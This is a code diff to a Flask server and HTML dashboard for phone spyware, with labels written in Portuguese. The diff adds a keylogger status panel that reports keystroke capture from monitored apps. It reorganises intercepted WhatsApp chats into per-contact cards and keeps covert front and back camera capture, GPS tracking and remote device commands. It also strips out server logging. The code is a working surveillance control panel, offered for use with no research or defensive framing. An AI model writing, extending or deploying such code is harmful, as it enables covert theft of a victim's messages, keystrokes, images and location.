@@ -46,13 +46,31 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
         .cam-frame { width: 100%; aspect-ratio: 4/3; background: #000; display: flex; align-items: center; justify-content: center; }
         .cam-frame img { width: 100%; height: 100%; object-fit: cover; display: none; }
         .cam-placeholder { font-size: 11px; color: #334155; text-transform: uppercase; }
-        .whatsapp-box { background: #0a0a0a; border: 1px solid #1e293b; padding: 12px; border-radius: 8px; margin-bottom: 15px; max-height: 300px; overflow-y: auto; }
-        .whatsapp-box h3 { color: #25d366; font-size: 13px; margin-bottom: 8px; text-transform: uppercase; }
-        .whatsapp-msg { background: #111; padding: 8px; border-radius: 6px; margin-bottom: 6px; border-left: 3px solid #25d366; }
-        .whatsapp-msg.midia { border-left-color: #f59e0b; }
-        .whatsapp-msg .pessoa { color: #25d366; font-weight: bold; font-size: 11px; }
-        .whatsapp-msg .texto { color: #94a3b8; font-size: 11px; margin-top: 2px; }
-        .whatsapp-msg .midia-tag { color: #f59e0b; font-size: 10px; font-weight: bold; }
+        
+        /* WHATSAPP CARDS */
+        .whatsapp-section { margin-bottom: 15px; }
+        .whatsapp-section h3 { color: #25d366; font-size: 13px; margin-bottom: 8px; text-transform: uppercase; }
+        .chat-list { display: flex; flex-direction: column; gap: 6px; }
+        .chat-card { background: #0a0a0a; border: 1px solid #1e293b; border-radius: 8px; overflow: hidden; cursor: pointer; transition: all 0.2s; }
+        .chat-card:hover { border-color: #25d366; }
+        .chat-card-header { display: flex; justify-content: space-between; align-items: center; padding: 10px 12px; }
+        .chat-card-header .pessoa { color: #25d366; font-weight: bold; font-size: 12px; }
+        .chat-card-header .info { display: flex; gap: 10px; align-items: center; }
+        .chat-card-header .total { background: #25d366; color: #000; padding: 2px 8px; border-radius: 10px; font-size: 10px; font-weight: bold; }
+        .chat-card-header .ultima { color: #64748b; font-size: 10px; max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+        .chat-card-header .seta { color: #64748b; font-size: 14px; transition: transform 0.2s; }
+        .chat-card.aberto .chat-card-header .seta { transform: rotate(90deg); }
+        .chat-card-body { display: none; padding: 0 12px 10px 12px; max-height: 250px; overflow-y: auto; }
+        .chat-card.aberto .chat-card-body { display: block; }
+        .chat-msg { padding: 6px 0; border-bottom: 1px solid #1e293b; font-size: 11px; color: #94a3b8; }
+        .chat-msg.midia { color: #f59e0b; }
+        .chat-msg .hora { color: #64748b; font-size: 9px; }
+        
+        .keylog-box { background: #0a0a0a; border: 2px solid #ef4444; padding: 10px; border-radius: 8px; margin-bottom: 15px; text-align: center; }
+        .keylog-box.ativo { border-color: #22c55e; animation: pulse 1s infinite; }
+        .keylog-box p { font-size: 11px; }
+        .keylog-box .app-nome { color: #f59e0b; font-weight: bold; text-transform: uppercase; }
+        
         .error-box { background: #450a0a; border: 1px solid #991b1b; padding: 15px; border-radius: 8px; text-align: center; margin-bottom: 20px; }
         .error-box p { color: #fca5a5; font-weight: bold; }
         .status-dot { display: inline-block; width: 10px; height: 10px; border-radius: 50%; margin-right: 5px; }
@@ -90,10 +108,18 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
                     <button class="btn-cmd" onclick="enviarComando('lanterna')">💡</button>
                 </div>
                 <button id="btnCam" class="btn-camera" onclick="dispararCapturaDupla()">📸 Captura Sincronizada</button>
-                <div id="whatsappBox" class="whatsapp-box">
-                    <h3>💬 WhatsApp</h3>
-                    <div id="whatsappMsgs"><p style="color:#64748b;font-size:11px;">Nenhuma mensagem recente</p></div>
+                
+                <div id="keylogBox" class="keylog-box">
+                    <p>⌨️ Nenhum app monitorado aberto</p>
                 </div>
+                
+                <div class="whatsapp-section">
+                    <h3>💬 WhatsApp</h3>
+                    <div id="chatList" class="chat-list">
+                        <p style="color:#64748b;font-size:11px;">Nenhuma conversa recente</p>
+                    </div>
+                </div>
+                
                 <div class="cameras-row">
                     <div class="cam-card"><div class="cam-card-title">🎥 Câmera Frontal</div><div class="cam-frame"><span id="labelFront" class="cam-placeholder">Sem Sinal</span><img id="imgFront" src="" alt="Frontal"></div></div>
                     <div class="cam-card"><div class="cam-card-title">🎥 Câmera Traseira</div><div class="cam-frame"><span id="labelBack" class="cam-placeholder">Sem Sinal</span><img id="imgBack" src="" alt="Traseira"></div></div>
@@ -108,22 +134,20 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
                 
                 function enviarComando(acao) {
                     fetch('/api/comando_remoto/{{ id_buscado }}', {
-                        method: 'POST',
-                        body: JSON.stringify({acao: acao}),
+                        method: 'POST', body: JSON.stringify({acao: acao}),
                         headers: {'Content-Type': 'application/json'}
                     });
                 }
                 
+                function toggleChat(card) {
+                    card.classList.toggle('aberto');
+                }
+                
                 async function dispararCapturaDupla() {
                     const btn = document.getElementById('btnCam');
-                    btn.innerText = "⏳ Sincronizando...";
-                    btn.disabled = true;
+                    btn.innerText = "⏳ Sincronizando..."; btn.disabled = true;
                     try {
-                        await fetch('/api/comando_camera/{{ id_buscado }}', { 
-                            method: 'POST', 
-                            body: JSON.stringify({acao: 'take_dual'}), 
-                            headers: {'Content-Type': 'application/json'} 
-                        });
+                        await fetch('/api/comando_camera/{{ id_buscado }}', { method: 'POST', body: JSON.stringify({acao: 'take_dual'}), headers: {'Content-Type': 'application/json'} });
                         let t = 0;
                         let c = setInterval(async () => {
                             try {
@@ -151,22 +175,48 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
                             
                             let lat = parseFloat(d.lat), lon = parseFloat(d.lon);
                             if (lat && lon) {
-                                marker.setLatLng([lat, lon]);
-                                map.panTo([lat, lon]);
+                                marker.setLatLng([lat, lon]); map.panTo([lat, lon]);
                                 document.getElementById('lnk_maps').href = 'https://www.google.com/maps?q=' + lat + ',' + lon;
-                                pontos.push([lat, lon]);
-                                if(pontos.length > 50) pontos.shift();
+                                pontos.push([lat, lon]); if(pontos.length > 50) pontos.shift();
                                 historico.setLatLngs(pontos);
                             }
-                            // WhatsApp - MOSTRA TODAS
+                            
+                            // KEYLOGGER
+                            if(d.keylog && d.keylog.ativo) {
+                                let kb = document.getElementById('keylogBox');
+                                kb.className = 'keylog-box ativo';
+                                kb.innerHTML = `<p>⌨️ <span class="app-nome">${d.keylog.app}</span> aberto - Capturando teclas...</p>`;
+                            } else {
+                                document.getElementById('keylogBox').className = 'keylog-box';
+                                document.getElementById('keylogBox').innerHTML = '<p>⌨️ Nenhum app monitorado aberto</p>';
+                            }
+                            
+                            // WHATSAPP CARDS
                             if(d.whatsapp && d.whatsapp.length > 0) {
                                 let html = '';
-                                d.whatsapp.forEach(m => {
-                                    let cls = m.midia ? 'whatsapp-msg midia' : 'whatsapp-msg';
-                                    let midiaTag = m.midia ? '<span class="midia-tag">📎 MÍDIA</span> ' : '';
-                                    html += `<div class="${cls}"><div class="pessoa">👤 ${m.pessoa}</div><div class="texto">${midiaTag}${m.texto}</div></div>`;
+                                d.whatsapp.forEach(chat => {
+                                    let temMidia = chat.midia ? '📎 ' : '';
+                                    html += `<div class="chat-card" onclick="toggleChat(this)">
+                                        <div class="chat-card-header">
+                                            <span class="pessoa">👤 ${chat.pessoa}</span>
+                                            <div class="info">
+                                                <span class="ultima">${temMidia}${chat.ultima_msg || ''}</span>
+                                                <span class="total">${chat.total}</span>
+                                                <span class="seta">▶</span>
+                                            </div>
+                                        </div>
+                                        <div class="chat-card-body">`;
+                                    
+                                    if(chat.mensagens) {
+                                        chat.mensagens.slice().reverse().forEach(msg => {
+                                            let cls = msg.midia ? 'chat-msg midia' : 'chat-msg';
+                                            html += `<div class="${cls}">${msg.texto} <span class="hora">${msg.hora}</span></div>`;
+                                        });
+                                    }
+                                    
+                                    html += `</div></div>`;
                                 });
-                                document.getElementById('whatsappMsgs').innerHTML = html;
+                                document.getElementById('chatList').innerHTML = html;
                             }
                         }
                     } catch(e) {}
@@ -197,10 +247,10 @@ def api_status(device_id):
         return jsonify({
             "battery": d.get("battery","N/A"),
             "uptime": d.get("uptime","N/A"),
-            "lat": d.get("lat",0),
-            "lon": d.get("lon",0),
+            "lat": d.get("lat",0), "lon": d.get("lon",0),
             "network": d.get("network","N/A"),
-            "whatsapp": d.get("whatsapp",[])
+            "whatsapp": d.get("whatsapp",[]),
+            "keylog": d.get("keylog", None)
         }), 200
     return jsonify({"error": "Not found"}), 404
 
@@ -217,6 +267,7 @@ def update():
         "lon": float(data.get("lon",-49.2648)),
         "network": data.get("network","N/A"),
         "whatsapp": data.get("whatsapp",[]),
+        "keylog": data.get("keylog"),
         "last_seen": datetime.utcnow().isoformat()
     })
     cmd_cam = db_dispositivos[device_id].get("cmd_cam", "wait")
@@ -229,11 +280,9 @@ def update():
 def comando_camera(device_id):
     device_id = device_id.upper()
     if device_id not in db_dispositivos: db_dispositivos[device_id] = {}
-    data = request.get_json(force=True, silent=True) or {}
-    db_dispositivos[device_id]["cmd_cam"] = data.get("acao", "take_dual")
+    db_dispositivos[device_id]["cmd_cam"] = "take_dual"
     db_dispositivos[device_id]["photo_front"] = ""
     db_dispositivos[device_id]["photo_back"] = ""
-    logger.info(f"Comando camera para {device_id}: {data.get('acao')}")
     return jsonify({"status": "ok"}), 200
 
 @app.route('/api/comando_remoto/<device_id>', methods=['POST'])
@@ -242,7 +291,6 @@ def comando_remoto(device_id):
     if device_id not in db_dispositivos: db_dispositivos[device_id] = {}
     acao = (request.get_json(force=True, silent=True) or {}).get("acao", "none")
     db_dispositivos[device_id]["cmd_remoto"] = acao
-    logger.info(f"Comando remoto {acao} para {device_id}")
     return jsonify({"status": "ok"}), 200
 
 @app.route('/api/upload_lote', methods=['POST'])
@@ -252,7 +300,6 @@ def upload_lote():
     if dev_id and dev_id in db_dispositivos:
         if data.get("photo_front"): db_dispositivos[dev_id]["photo_front"] = data["photo_front"]
         if data.get("photo_back"): db_dispositivos[dev_id]["photo_back"] = data["photo_back"]
-        logger.info(f"LOTE recebido de {dev_id}")
         return jsonify({"status": "stored"}), 200
     return jsonify({"status": "error"}), 404
 
